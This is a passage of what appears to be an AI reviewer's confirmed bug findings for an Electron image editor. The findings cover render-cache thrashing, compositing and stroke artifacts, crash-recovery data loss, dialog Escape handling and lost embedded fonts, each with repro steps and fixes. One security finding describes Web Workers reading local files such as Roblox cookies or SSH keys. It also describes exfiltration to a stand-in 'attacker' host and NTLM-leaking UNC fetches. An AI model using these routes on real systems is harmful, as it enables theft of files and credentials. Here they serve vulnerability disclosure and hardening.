- 85% anti-aliased disc and 6 px feathered disc: also correct.
- Random soft and feathered mattes: depth-dependent pixels drop from 218k/175k to 0.
- Bevel on 70% alpha: 8 px with either field depth, the same as opaque.
- Binary mattes are unchanged, so the brute-force EDT test still holds. Opaque anti-aliased mattes change only 81 of about 2.3M px (42 with `d2 <= 4`), at disc overlaps.

Optional follow-up: shrink `fieldReach` in region.ts:97, whose "+3 for soft pixels" rationale no longer applies. Then extend the test at review.test.ts:94 ("identical results from a deeper cached field") with soft mattes: a 70%-alpha block and a feathered disc. Also add a fresh-width assertion, for example that inside stroke size 2 on a 70% block is 2 px wide.

confirmed.title: Render-cache thrash cliff: painting drops from about 8 ms to 1.1–1.7 s per frame once a document's renders exceed the 64M-px slot budget
confirmed.issue:
Layer renders with effects keep several doc-sized canvases plus Float32 distance fields, which count byteLength/4 against the budget. A full-canvas layer with Drop Shadow + Stroke costs about 33M px at 4K and about 8M px at 1080p. Pose Studio characters and many assets are doc-sized rasters.

Once the working set passes SlotCache's fixed 64M-px budget, evict() throws out the least recently used slots down to 85% on every insert. That includes the below cache (SB|): belowCache() inserts it before fillBelow() renders the layers below, so the renders inserted afterwards evict it. It also includes the doc composite and the renders that will be needed next frame. Every brush frame then re-renders every layer: 'slots: 2' remain after each frame.

The limit is reached by a 4K document with only 2 such layers, or a 1080p document with 7. Painting freezes. Stock templates fit (32–34M px). This is not a regression; 064b27f measures the same.
confirmed.evidence:
Repro scripts: rv-render-paint-diff/perf4k.full.js (and perf4k-diag.full.js for per-frame rebuild lists). Each run: background layer + N full-canvas layers (Drop Shadow + Stroke) + a painted layer with a shadow; 40 brush frames of bitmaps.touch(rect) + renderDocumentLive({since}).

3840×2160 mean ms per frame:
- N=0: 2.9
- N=2: 1613 (160 layer re-renders over the 40 frames)
- N=4: 3289
- N=6: 4188

1920×1080 mean ms per frame:
- N=2, 4, 6: about 8.5
- N=7: 1135 (9 re-renders per frame)
- N=8: 1321
- N=10: 1784

perf4k-diag shows that each frame BG and FX0 are missing from the cache, FX1 and Paint are rebuilt, and only 2 slots survive. 064b27f build: N=2 at 4K = 1770 ms per frame, so the cliff is pre-existing.

Code: src/render/cache.ts:288-300 (evict), :310 (budget 64M px); src/render/engine.ts:2377-2387 (belowCache inserts its slot before :2392 fillBelow renders the layers below).
confirmed.fix: Make eviction pass-aware: stamp entries with a render-pass generation and never evict entries used in the current pass. Let the budget overflow temporarily, then shrink when idle. Re-touch the SB slot (slots.get) after fillBelow so it is most recently used, or insert it after filling. Scale the budget with document size, e.g. max(64M px, 12 × width × height, capped by navigator.deviceMemory). Optionally drop distance fields first under memory pressure. Add a perf regression test: 1080p with 8 full-canvas FX layers must stay under ~30 ms per brush frame.

verdict.note:
I reproduced this from scratch with my own scripts, both through the real brush and viewport and through the render API. Scripts are in /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-render-paint-diff-v2/: run.mjs, ui.js, perf.js, perf2.js, edits.js, cost.js. The build is dist/, made with vite.rv.config.mjs.

**Real UI path (ui.js)**
Setup: File > New at 1920x1080. Add N layers with Layer > New > Layer (layerOps.newLayer, src/panels/layerOps.ts:310-315; the bitmap is document-sized). On each, paint an ellipse blob and add Drop Shadow + Stroke. Then add a fresh layer with no effects and paint on it with the real brush tool through pointer events on .viewport-overlay.
- N=5: 3.3 ms per pointermove.
- N=7: 3.2 ms.
- N=8: 1114 ms, with 200 layer re-renders over 20 frames.
- 4K UHD (a stock preset, src/templates/presets.ts:29): N=1 gives 6.7 ms, N=2 gives 1123 ms.

**Other edits past the cliff (edits.js, 1080p, N=8)**
The whole editor slows down, not only painting.
- Opacity-drag ticks: 1901 ms each at N=8, versus 54 ms at N=6.
- Arrow-key-style nudges: 1740 ms each at N=8, versus 38 ms at N=6.

**API path (perf.js)**
At 1080p, doc-sized layers with Drop Shadow + Stroke:
- N=4 to 6: 6.7 to 7.8 ms per frame.
- N=7: 1116 ms.
- N=8: 1279 ms.
- N=10: 1488 ms.
Every layer is re-rendered every frame. This matches the reviewer's numbers.

**Why it happens (cost.js)**
- One doc-sized raster with Drop Shadow + Stroke holds about 8.6M px of cache budget at 1080p. That is roughly 4 doc-sized buffers: the core canvas, two behind pieces, and a Float32 distance field. At 4K it is about 35M px.
- The cost does not depend on content. An 80x80 or 120x180 blob on a New Layer costs the same as a full image (perf2.js shows the same cliff at N=7). The render already computes `tight` (opaque content bounds), but its region stays the full layer box.
- Once all layer renders together exceed the 64M px budget, LRU eviction with a cyclic access pattern gets zero hits. cache.ts:288-296 evicts down to 85% on every insert.
- The comment at cache.ts:305-309 claims about 10 such layers fit "so live edits never thrash". My measurement contradicts that.
- This is not listed in HANDOFF.md, ARCHITECTURE.md or docs/status.

**Corrections to the report**
- Pose Studio output is not doc-sized. It is cropped to opaque bounds plus padding (src/roblox/studio/output.ts:51-60). Assets with sizing:'document' (src/assets/place.ts:155-158) and New Layer are doc-sized. New Layer plus paint plus a layer style is the realistic trigger.
- Major is the right severity: no crash or data loss, but at 4K two common layer styles freeze editing.

**Testing the proposed fix**
I built two prototypes through a Vite overlay plugin; tracked files were not modified.
- Patch A, re-touching the SB slot after fillBelow (patchA/engine.ts), changes nothing: 1093 ms per frame at N=8. The layer renders alone already exceed 64M px.
- Scaling the budget as max(64M, 12·W·H) changes nothing at 1080p, because 12·W·H there is about 25M px, below 64M. At 4K it adds only about 1.5x headroom.
- Protecting only entries used in the current pass is also not enough. While painting, the layers below are served by the below cache and are not touched each frame, so they get evicted and are re-rendered every time the stroke enters a new 128 px tile.
verdict.betterFix:
Make the slot budget soft during interaction. This is validated by prototype patchB/cache.ts.
1. In SlotCache.get() and set(), stamp each slot with `t = performance.now()`.
2. In evict(), skip slots used in the last ~1.5 s as long as the total stays under a hard cap (for example 3x the budget). Past the cap, fall back to plain LRU.
3. When still over budget, arm a ~2 s idle timer that evicts down to the budget, ignoring recency.

Prototype results:
- 1080p N=8 painting: 1093 → 3.1 ms per frame.
- 4K N=2 painting: 1123 → 5.6 ms.
- Opacity and nudge edits: 1.7–1.9 s → 57–65 ms.
- Peak cache: 71–76M px against the 64M budget.

Also shrink the per-layer footprint so bigger documents stay under the cap:
- Crop effect layer renders (core, behind pieces, distance fields) to the already computed `tight` opaque bounds plus effect padding, instead of the full layer box. A small blob on a New Layer then costs about 0.1M px instead of 8.6M.
- Keep the borrowed bitmap as `core` when only behind effects exist.
- Drop or downsize the Float32 distance fields once the effects are built.

Fix the comment at cache.ts:305-309. Add a perf regression test: 1080p with 8 Layer > New > Layer layers, each with Drop Shadow + Stroke, and 4K with 2 such layers, must stay under ~30 ms per brush frame.

confirmed.title: renderDocument({below}) returns a background-only hole after an edit inside a styled group (Levels/Curves histogram, PSD bake of adjustment layers)
confirmed.issue:
In compositeDocument's incremental path, planIncremental() calls itemRegion() → renderLayer() for changed items before recomposite(), using the same rc. When the changed item is a non-plain group containing the `below` layer, buildLayerRender → drawContent(group) → compositeList() reaches `below` and sets rc.stopped = true without restoring it. recomposite() then clears the dirty rectangle, fills the background, and compositeList() returns immediately because rc.stopped is already true. The returned and cached composite has a hole showing only the background.

A non-plain group here means one with an effect, blend mode, opacity below 100%, mask or smart filter. Users hit this through:
- useBelowHistogram, which re-renders {below} on every edit while an adjustment's Properties show the histogram.
- psd.ts adjustmentBackdrop, which takes the main-document path for pass-through groups that carry effects or opacity, on a second PSD export after edits.

Repro script: rv-render-paint-diff/below.full.js.

confirmed.title: Inside Stroke / inner Bevel / Satin draw a fake edge along the canvas border when a layer extends past the canvas (and the screen flips while dragging)
confirmed.issue:
buildLayerRender clips a layer's region to the document grown by flipSides(grow), where grow is the effects' reach (extent). Inside stroke, inner bevel and satin declare reach 0, so content beyond the canvas edge is cut off. Their distance fields then see an edge at the canvas border and draw a stroke, bevel or satin band there in renders and exports. Inner Glow and Inner Shadow are not affected.

Translation reuse makes the result depend on history: dragging such a layer partly off-canvas shifts a cached render made while it was fully inside (no band), while a fresh render shows the band. Characters or titles that bleed off the canvas with these styles show the artifact in exports. The same result occurs at 064b27f.
confirmed.evidence:
Repro script: rv-render-paint-diff/edgefx.full.js. Setup: a 200×200 layer at y=180 on a 400×300 canvas (runs 80 px off the bottom). The fresh export is compared with the same layer on a 400×500 canvas, cropped.
- Inside Stroke 6: band of 6 rows along the bottom border, 3,384 px, max 192 (bottom pixel [0,255,0] stroke green vs [48,96,192] layer colour).
- Bevel 10: 15 rows, 8,211 px, max 159.
- Satin 14: 16 rows, 8,289 px, max 68.
- Inner glow / inner shadow: exact.

moveedge.full.js: an inside-stroke layer moved by whole pixels across the bottom edge gives a cached render with no band vs a fresh render with the band (924–1,386 px, max 224).

Code: src/render/engine.ts:1714 (region clipped to expandSides(docR, flipSides(grow))); src/render/effects/stroke.ts:93-97 (reach 0 for inside); src/render/effects/bevel.ts:110 and :158 (reach 0); engine.ts translation `clip` uses the same flipSides(grow).
confirmed.fix: Clip the content region to the document grown by how far content can influence visible output, not only by reach. For example: `const infl = flags.effects ? effectsInfluenceOf(l, s) : 0; const region = intersectRect(expandSides(cover, grow), expandSides(docR, maxSides(flipSides(grow), {l: infl, t: infl, r: infl, b: infl})))`. Use the same widened clip in translation reuse (MoveInfo.clip). Effect output beyond the document is still never shown.

verdict.note:
I reproduced this from scratch in the 363ced4 snapshot, using my own build that exposes the render modules (vite.v4.config.mjs, run.mjs and lib.js in /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-render-paint-diff-v4/). **Cause (confirmed in code).**
- engine.ts:1714 clips the layer region to `expandSides(docR, flipSides(grow))`.
- Inside stroke (stroke.ts:93-97), inner bevel (bevel.ts:110) and satin (bevel.ts:158) all declare reach 0, so the content is cut exactly at the canvas border.
- `LayerFields.alpha` (engine.ts:672-696) treats everything outside the region canvas as alpha 0. The distance field rect is padded past the region, so the cut looks like a real content edge.
- Inner glow and inner shadow escape this only because they declare a reach greater than 0 on purpose (shadows.ts:101 comment: "needs margin… so its blur never sees the surface edge").

**Repro 1: export (edge.js).** A 200x200 layer at y=180 on a 400x300 canvas, so 80 px hang off the bottom. Exported with `renderForExport` after clearing caches, and compared with the same layer on a 400x500 canvas, cropped to 400x300.
- Inside stroke 6: a green band 6 rows tall along the bottom border, max diff 192. The bottom pixel is [0,255,0] where it should be the layer colour [48,96,192].
- Inner bevel 10 (Bevel & Emboss defaults to Inner): 15 rows, max diff 159.
- Satin 14: 16 rows, max diff 68.
- Emboss: 2 rows, max diff 4.
- Inner glow, inner shadow, and outside and center strokes: exact.

**Repro 2: history dependence (move.js, drag2.js, drag3.js).** Render the layer while it is fully inside the canvas, then move it by whole pixels past the bottom edge.
- The cached render shows no band, while a fresh render shows one (1128 px, max diff 192; bevel and satin behave the same).
- With a real Move-tool drag at 100% zoom, the screen and the export right after the drag show no band. They still show none after a stroke colour edit, because the content is reused.
- A document opened with the layer already past the edge shows the band on screen and in the export.
- Net effect: the same document exports differently depending on edit history, and a band appears after reopening.
- This also breaks the comment at engine.ts:822 that a shifted render "is identical to a fresh render". The correct output is the no-band version: it matches both the taller canvas and Photoshop, which keeps a layer's off-canvas pixels.

No built-in preset uses inside stroke, inner bevel or satin (Gothic Emboss uses the emboss style, which is only off by 4 levels). Users do hit it, though, when they add Bevel & Emboss with its defaults, or an inside stroke, to a character that runs off the canvas.

**Fix.** The proposed fix is right, and the influence helper it names already exists: `effectsInfluenceOf` at engine.ts:1089, built on region.ts `effectInfluence`. I prototyped it on a scratch copy; the diff is in fix.diff. Both places need it:
- In `buildLayerRender` (engine.ts:1714):
  `const infl = flags.effects ? Math.ceil(effectsInfluenceOf(l, s)) : 0; const region = intersectRect(expandSides(cover, grow), expandSides(docR, maxSides(flipSides(grow), {l:infl,t:infl,r:infl,b:infl})));`
- The same widened `clip` for translation reuse at engine.ts:873.

Results with the patched build:
- edge.js: every effect is exact (0 px diff), emboss included.
- move.js: cached and fresh renders agree in every case.
- drag2.js: no band in any scenario.
- Translation reuse still applies (5 of 5 hits on downward moves, results exact).
- Live paint region updates on a layer that crosses the edge match a fresh render.

The cost is a region that extends a few pixels past the document for layers with these effects.

Use the existing helper `effectsInfluenceOf` (engine.ts:1089, built on region.ts `effectInfluence`), rounding up with Math.ceil, as the per-side minimum in two places: the doc clip in `buildLayerRender` (engine.ts:1714) and the translation-reuse `clip` (engine.ts:873). confirmed.title: Crash recovery is silently skipped when the crashed project is reopened by double-click; Save/Close then deletes the autosave permanently
confirmed.issue: Projects keep their document id across save/load: decodeProject only renames the id when that id is already open. Recovery entries are keyed by that id, and offerRecovery runs 1.2 s after start and drops every entry whose id is open (`.filter((e) => !useEditor.getState().sessions[e.id])`). So after a crash, if the user gets back to work the usual way — double-clicking Poster.pgfx, which goes through argv / OS hand-over and openFromOS → openFile — the clean on-disk copy opens with the same id and the autosave is never offered. verdict.note:
I reproduced this from scratch with my own script, /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-app-logic-diff-v0/crash-reopen.mjs. - **control** (plain relaunch): the "Recover unsaved documents?" dialog appears. Recovery works on this path.
- **save** (relaunch with Poster.pgfx as argv, like a double-click): no dialog. The session reopens with the same id, guides:0, clean, and the 5-guide entry is still in IndexedDB. After one edit and Ctrl+S, IndexedDB is empty (`idb: []`).
- **close**: same reopen, then File > Close on the clean tab. IndexedDB is empty again (closeOps.ts:32 removes the entry without checking).
- **edit-autosave** (new, worse than the report): same reopen, one edit, no save, no close. After the next autosave tick the entry with the same id is overwritten: `{guides:1}` replaces `{guides:5}`. autosaveTick → putRecovery (autosave.ts:149) keys entries by the document id, and that id is stored in the file. So simply keeping on working for one autosave interval (2 minutes by default) silently destroys the crash work.
- **open-recent-save**: plain relaunch shows the dialog, the user clicks "Later", opens Poster via File > Open Recent and presses Ctrl+S. The deferred entry is deleted.
- **quit-relaunch**: reopen via argv, quit cleanly, then a plain relaunch. The dialog does appear. This is the only way out, and nothing tells the user to take it.

Root cause, confirmed in code:
- decodeProject keeps the file's doc id (project.ts:190 renames it only when that id is already open).
- offerRecovery drops entries whose id is open (autosave.ts:230).
- The file the OS hands over arrives at did-finish-load and decodes in well under the 1.2 s offerRecovery timer (autosave.ts:257), so the clean copy is already open when recovery runs.
- removeRecovery runs unconditionally at save.ts:79/94 and closeOps.ts:32.
- putRecovery reuses the same IndexedDB key (autosave.ts:149).

HANDOFF.md does not list this as a known gap. This is a full-process crash, not the renderer-crash Reload prompt; that prompt's Reload path works. Any power loss, forced Windows restart or Task Manager kill, or choosing "Quit" on the crash prompt, followed by double-clicking the file or using the taskbar jump list, leads to silent, permanent loss of work the app had kept.

Severity: blocker fits the rubric (silent data loss, and the app itself deletes or overwrites the recoverable copy). The caveat is that it only happens after a crash, which is exactly when the feature exists to help. Major would be the lowest defensible rating.

The proposed fix is only partly right. Part 2 (guard removeRecovery with `stored.has(id)`) is not enough: the autosave put still overwrites the leftover entry, as the edit-autosave run shows.
verdict.betterFix:
Stop keying recovery entries by document id. That id lives in the .pgfx file and survives save and load, so a reopened file always collides with its own crash entry.
- Give each running app instance a key such as `launchId = uid('run_')` and store entries under `key = launchId + ':' + docId`. Keep `docId` and `launchId` as fields on the entry.
- putRecovery, removeRecovery and the `stored` set work only with the current launch's keys. save.ts:79/94, closeOps.ts:32 and the subscribe cleanup then can never delete or overwrite a previous run's entry.
- offerRecovery offers every entry whose launchId differs from the current one, whether or not a document with that docId is open. Drop the `!sessions[e.id]` filter at autosave.ts:230.
- When recovering an entry whose docId matches an open session that is clean and has the same filePath, replace that session: close the clean tab, then open the recovered document with the original id and filePath. That avoids two tabs pointing at the same path. Otherwise let decodeProject remap the id, as it already does.
- Label these entries in RecoveryDialog, for example: "Unsaved changes to Poster.pgfx (autosaved 10:42), newer than the copy you have open".
- Delete a previous run's entry only when the user chooses Recover or Discard. "Later" keeps it.
- Optionally, have openFromOS / the argv queue wait for offerRecovery to finish (await a startup promise) so the dialog comes first. With the key change this is only for UX, not correctness.
- Add a regression test for each path: crash, then reopen via argv, then (a) Ctrl+S, (b) close the tab, (c) edit and wait for an autosave tick. In every case the old entry must still be offered on the next start or right away.

confirmed.title: Windows log-off/shutdown with unsaved work deletes the autosaved copy on the next launch (session-end + pagehide marker)
confirmed.issue: electron/main.cjs (added in this range, a963d2a) handles 'session-end' by setting forceClose so the following window close is not blocked. Its comment says "autosave keeps unsaved work for recovery", and HANDOFF says "Windows session end never blocked". On the renderer side, startAutosave registers `pagehide → markClosedWithoutSaving`, which treats every normal page unload with dirty documents as a deliberate "Don't Save": it writes their ids to 'perseverance.recovery.closedDirty'. On the next start offerRecovery calls discardEntries on exactly those ids. So when the window closes after session-end — the sequence main.cjs prepares for and scripts/electron-desktop-check.mjs Phase C simulates — the autosaved work is silently deleted on the next launch. This includes Windows Update restarts overnight with the app open. Severity is major rather than blocker because it depends on Windows actually unloading the page after session-end; it follows the shutdown sequence the project's own check uses.

Script: rv-app-logic-diff/session-end.mjs. Steps: launch Electron (isolated XDG_CONFIG_HOME); open the demo, make an edit, wait for autosave ('recovery entries before session end: [doc_muvptbrz1nvt58lg]'); in the main process `w.emit('session-end'); w.close()` (same as electron-desktop-check.mjs Phase C); relaunch.

Remove the generic pagehide marker and instead call discardEntries/removeRecovery, or write the marker, in confirmQuit's "Don't Save" branch (desktopIntegration.ts) and in the browser unload-confirm path. Alternatively, have main send a 'desktop:session-ending' IPC from the session-end handler before allowing the close, and skip markClosedWithoutSaving when it arrives. Add a desktop check: dirty + autosaved, then session-end, then relaunch must offer recovery.

The mechanism is real: any clean page unload with dirty, autosaved documents is treated as "Don't Save" and the recovery copy is deleted on the next launch. But the headline trigger (Windows log-off, shutdown or an overnight update restart) is not shown, and is probably not what Windows does. What is shown is one reachable flow, which is why I rate it minor rather than major.

Script: /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-app-logic-diff-v1/recovery-unload.mjs. Call it in confirmQuit just before `return true` in the 'discard' branch (desktopIntegration.ts:42), passing the dirty ids.

confirmed.title: Escape in a colour popover or dropdown menu inside a dialog closes the whole dialog (settings lost) instead of just the popover
confirmed.issue: Dialog registers a window keydown listener in the capture phase. On Escape it calls `e.stopPropagation(); onClose()` for the topmost dialog, with no check for floating UI. Popover and MenuHost listen for Escape on window in the bubble phase, so they never see the key. The dialog closes with all its settings, and for Fill/Stroke the action is cancelled. The new focus-trap code already knows about popovers and menus portaled outside the dialog (`inFloatingUi`, Dialog.tsx:81/164), but only for Tab. This hits every dialog with a ColorField or menu: New Document, Fill, Stroke, Canvas Size, Export, Pose Studio colours, Remove Background.
confirmed.evidence:
Script: rv-app-logic-diff/esc-popover.node.mjs (run.mjs against vite preview of snap-dist). Steps: open the demo; Edit ▸ Fill; set Contents = Color; click the colour swatch (popoverOpen: true); press Escape.
- Observed: `afterEsc: {"popover":false,"dialog":false}` — the Fill dialog is gone.
- Expected: only the colour popover closes and the dialog stays open with its settings.

I reproduced this from scratch against a vite preview of snap-dist on port 5396, using real Playwright clicks and real Escape key presses.

Scripts are in /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-app-logic-diff-v2/:
- esc-floating.mjs: Fill and New Document
- esc-filter.mjs: filter and adjustment dialogs
- esc-fixcheck.mjs: checks a candidate fix

So the reach is wider than the finding says: every filter or adjustment dialog with a colour or gradient parameter is hit, through ParamEditor.tsx:106/126.

Root cause is as described:
- Dialog.tsx:184 handles Escape in a window capture-phase listener (registered at :196) and calls stopPropagation then onClose. It has no check for floating UI.
- Popover (popover.tsx:70-75) and MenuHost (popover.tsx:222/227) listen in the bubble phase, so they never see the key.
- The same codebase already guards exactly this case elsewhere: Dock.tsx:527 checks `document.querySelector('.ui-popover, .ui-menu')`, and colorRange.tsx:570 has otherUiOwnsKeys.

Corrections:
- Remove Background (src/roblox/bg/RemoveBgDialog.tsx) contains no ColorField, Popover or menu, so it is not affected.
- The "dropdown menu" part is mostly moot. The Select dropdowns in dialogs are native `<select>`, which handles Escape itself. The only in-dialog custom menu is the right-click on user templates in NewFromTemplateDialog.

Severity: minor is right. Nothing in the document is lost; Fill/Stroke are cancelled and filter previews are cancelled cleanly. The user only loses the dialog's in-progress settings and has to redo them.

The proposed fix is only partly right:
- The early return alone (option 1) is not enough. I patched a copy (rv-app-logic-diff-v2/fixcopy, built to dist-fix1) and tested it. With focus in the popover's hex input, Escape did nothing at all: popover still open, dialog still open. The reason is that the hex input's React onKeyDown (color.tsx:215-216) calls e.stopPropagation(), so the native event never bubbles to the Popover's window listener.
- Option 2 ("registered after the dialog") is fragile. Dialog re-registers its listener on every render, because the effect depends on [onClose, onSubmit] and those are inline arrows. So registration order cannot be relied on.
verdict.betterFix:
Do both of these. I built and tested the combination in rv-app-logic-diff-v2/dist-fix2.

1) Dialog.tsx:184: inside `if (e.key === 'Escape') {`, add `if (document.querySelector('.ui-popover, .ui-menu')) return;` before stopPropagation/onClose. This leaves the key to the floating surface, which is the same guard Dock.tsx:527 uses.

2) popover.tsx: register the Escape listeners of Popover (line 75) and MenuHost (line 227) in the capture phase, i.e. `window.addEventListener('keydown', key, true)` with the matching removeEventListener. A focused field inside the popover, such as the hex input that calls stopPropagation, can then no longer swallow Escape. Order between these listeners and Dialog's does not matter: the popover is still in the DOM for the whole dispatch, because React flushes the close in a microtask, so Dialog always sees it and returns.

Result with both changes: the first Escape closes only the popover and the dialog keeps its settings; a second Escape closes the dialog. This holds both when focus is on the swatch or dialog and when it is in the hex input. It also works in the Fill, Cel Shade, Photo Filter and Posterize Edges dialogs, with no page errors.

The global shortcut handler (keyboard.ts:141) already ignores keys while a dialog is open, so letting Escape pass the dialog has no side effects.

Optional polish: after the popover closes from the hex input, give focus back to the dialog. Right now focus falls to body, though the Tab trap still recovers.

confirmed.title: Fonts embedded in a shared project are lost through autosave/recovery and Save as Template; re-saving then drops them from the project
confirmed.issue:
encodeProject skips font embedding in background mode (`opts.background ? Promise.resolve([]) : embeddableFonts(doc)`, project.ts:60). Autosave (autosave.ts:145) and Save as Template (userTemplates.tsx:184) both use background mode, on the assumption that "this machine has the fonts". That is false for fonts that arrived embedded in a friend's project: registerEmbeddedFonts registers them for the session only (`sessionFiles`, not IndexedDB). Failure chain:
1. Open a friend's .pgfx whose text uses an embedded font this PC doesn't have.
2. Edit it, then the app crashes.
3. On restart the session font is gone, and the recovery container has no font entries. recoverEntries uses decodeProject, so no missing-font warning is shown either.
4. Saving the recovered document back to its path calls embeddableFonts → userFontFiles, which finds no file for that family. The project is rewritten without the font, which is now lost for everyone it's shared with.

The same happens with My Templates built from such a project: after a restart the template's text falls back to another font.
confirmed.evidence: Code-level argument along the call chain: project.ts:60 (background ⇒ no fonts) ← autosave.ts:145 `encodeProject(doc, { background: true })` → autosave.ts:186 `decodeProject(e.data)` (no reportProjectFonts) → save.ts `encodeProject(committed)` → projectFonts.embeddableFonts → userFonts.userFontFiles returns only IndexedDB-installed fonts and `sessionFiles` (empty after the restart) ⇒ the container is written without `fonts`. userTemplates.tsx:184 also writes templates with `{ background: true }`.
confirmed.fix: In background mode, still embed fonts that are not installed on this machine, i.e. families available only through `sessionFiles`. Recovery and template files are where those fonts would otherwise vanish. Simplest option: always call embeddableFonts and let background mode skip only IndexedDB-installed families. Also call reportProjectFonts after recoverEntries, so a missing font is reported instead of silently replaced.

verdict.note:
I reproduced this from scratch. The script is /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-app-logic-diff-v3/repro.mjs and its output is repro.log in the same folder.

**Setup.** The script serves snap-dist with vite preview on port 5397 and runs a real Chromium process with a persistent profile. A crash is simulated with SIGKILL, so pagehide never fires. The "friend's" file, friend.pgfx, is packed with the snapshot's own packContainer. It has one text layer in the family "FriendFont", and the font file is embedded. The machine does not have that font, either bundled or installed.

**Results:**
1. **Open the file.** The font is registered for the session (source 'user', tag 'project font') and the toast says "Using font embedded in 'Friend Poster': FriendFont".
2. **Control check.** Saving in the same session embeds the font: control-save.pgfx contains FriendFont/400/normal (26488 B).
3. **Edit and wait for autosave.** The recovery entry in the perseverance-recovery IndexedDB contains no fonts.
4. **Crash and restart, then Recover.**
   - FriendFont is not registered and its face is not loaded.
   - The only toast is "Recovered 1 document". There is no missing-font warning.
   - The text still says fontFamily "FriendFont" but draws in a sans-serif fallback (after-recover.png). The real font is a script face.
5. **Save the recovered document.** recovered-save.pgfx contains no fonts. On desktop, the recovered session keeps its filePath (autosave.ts:155, :187), so Save in place overwrites the friend's file without the font.
6. **Save as Template.** I re-opened friend.pgfx (font registered again) and ran Save as Template. The template stored in the perseverance-templates IndexedDB has no fonts. After a clean browser restart, building the template gives text with family FriendFont, but the font is not registered and there is no warning.

**Code check.** The call chain is as described in the finding:
- project.ts:60 skips fonts when `background` is set.
- autosave.ts:145 and userTemplates.tsx:184 both encode with `background: true`.
- recoverEntries (autosave.ts:186) and the user template `build()` (userTemplates.tsx:99) use `decodeProject`. They never call `reportProjectFonts`, which only runs from `loadProject` (project.ts:200).
- `userFontFiles` (userFonts.ts) only finds IndexedDB fonts plus the in-memory `sessionFiles` map, which is empty after a restart.
- The comment at project.ts:47 assumes "this machine has the fonts". That is false for embedded fonts held only in `sessionFiles`. The same is true for fonts added while font storage was unavailable, which also live only in `sessionFiles`.

This is not handled anywhere else, and HANDOFF.md does not list it as a known gap.

**Severity.** Minor is right. It is a silent loss of font data and a wrong render, but it needs a shared project with a custom font plus either a crash or Save as Template.
verdict.betterFix:
The proposed fix works. Here is a more precise version.

**1. Add a `sessionOnly` option to `userFontFiles`** (src/fonts/userFonts.ts). With it set, return only the `sessionFiles` records whose id is not in `useUserFonts.getState().files`. Pass it through from `embeddableFonts(doc, opts)` (src/io/projectFonts.ts).

**2. Change project.ts:60** to:
```ts
const fontsP = embeddableFonts(doc, { sessionOnly: !!opts.background });
```
Autosave then carries only fonts that exist nowhere else on this machine, which keeps the per-tick cost low.

**3. Embed all user fonts in templates.** For Save as Template, call `encodeProject(tdoc, { background: true, embedFonts: 'all' })` or an equivalent option. Templates are long-lived, so a font later removed from My Fonts (`removeUserFamily`) would otherwise break them silently too.

**4. Report fonts on recovery.** In `recoverEntries`, use `decodeProjectWithFonts` and call `reportProjectFonts(doc, embeddedFonts)` after `openDocument`. Do the same in the user template `build()` (or in openTemplate). Recovered or templated text whose family is still missing then gets the existing warning instead of silently falling back. This also covers recovery entries written before the fix.

**5. Fix the comment at project.ts:47.** It currently says "recovery files and templates stay on this machine, which has the fonts".

The decode side needs no change. `decodeProjectWithFonts` already calls `registerProjectFonts`, so once the fonts are in the recovery or template container they are registered back into `sessionFiles`, and the next Save embeds them again.

confirmed.title: Web Workers bypass the file:// blocking: any page script can read any local file (and on Windows contact any network share)
confirmed.issue: The only thing keeping the file:// page from reading local files is the session webRequest filter (main.cjs:789-798). Requests started by Dedicated and Shared Workers never reach that filter, and the CSP allows them (`worker-src 'self' blob:`). On a file:// page, 'self' matches any file: URL. So a blob: worker, or a worker script loaded from outside dist/, can fetch, XHR or importScripts any local file. Intercepting the file scheme with protocol.handle('file') does not see these loads either. This breaks the boundary that HANDOFF/ARCHITECTURE describe ("the page itself can only load file:// URLs inside its own dist/ folder ... a compromised page could read any local file"). Any script injection would be enough to steal, for example, %LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat, browser profiles or SSH keys. One route out is to navigate the page to https://attacker/?d=…: will-navigate hands any http(s) URL to shell.openExternal without a host allowlist or user gesture. On Windows, `fetch('file://attacker/share/x')` inside a worker also skips the 'no UNC' rule (that rule exists only in the filter), so it can leak the user's NTLM hash. The existing checks (electron-desktop-check.mjs and desktopMain.test.ts) only probe main-thread fetch, XHR and .
confirmed.evidence: R/worker-read-poc.mjs, real Electron 44 app with the shipped CSP. Main thread: fetch('file:///etc/hostname'), the test secret file and ~/.bashrc are all `blocked TypeError`. Blob worker running the same fetches: `ALLOWED vm`, `ALLOWED TOPSECRET-…`, `ALLOWED # ~/.bashrc: executed by`. main.log has exactly 3 'blocked file request' lines (the main-thread attempts only), so the worker loads never reached the filter. R/file-bypass.mjs and R/file-bypass2.mjs also show: `new Worker('file:///…/files/w.js')` runs a script from outside dist; importScripts from outside dist works; a SharedWorker reads the secret; a sync XHR inside a worker reads it. With protocol.handle('file') added to main (R/app-fix) the result is unchanged. With `worker-src 'none'` (R/app-csp) blob, file and shared workers and service-worker registration are all refused. The repo's 52-check desktop check, run in --full mode against that CSP, passes 52/52 (23 templates, 300 commands, 0 CSP violations). The app has no `new Worker` in src/ or in the built dist/.
confirmed.fix: In index.html:8, replace `worker-src 'self' blob:` with `worker-src 'none'`. Nothing in the app uses workers, and the full desktop check stays green. Extend the CSP test in desktopMain.test.ts:418 to require `worker-src 'none'`, or at least no blob: and no 'self' while the page loads from file://. Add a worker probe (blob worker fetching file:///etc/hostname) to electron-desktop-check.mjs. Also narrow openExternalSafe (main.cjs:120, used by will-navigate at :551 and setWindowOpenHandler at :547): https only, a host allowlist (www.roblox.com plus the project homepage), and stop auto-opening renderer-initiated navigations and popups. confirmed.title: A .pgfx dropped onto the window opens without its path: duplicate tab, and Save goes to Save As in another folder

(a) Opening a project that is already open does not switch to its tab: focusOpenProject(null) is false, so a second copy opens, against the HANDOFF rule "never opens twice, whichever way it is opened". (b) Ctrl+S cannot save in place: save.ts:84 opens a Save As dialog with only `Name.pgfx` and no folder, so it opens in the dialog's last-used folder. Pressing Enter writes a copy there and leaves the original unchanged; next time the user double-clicks the original, their edits seem lost. (c) The file is never added to Open Recent.
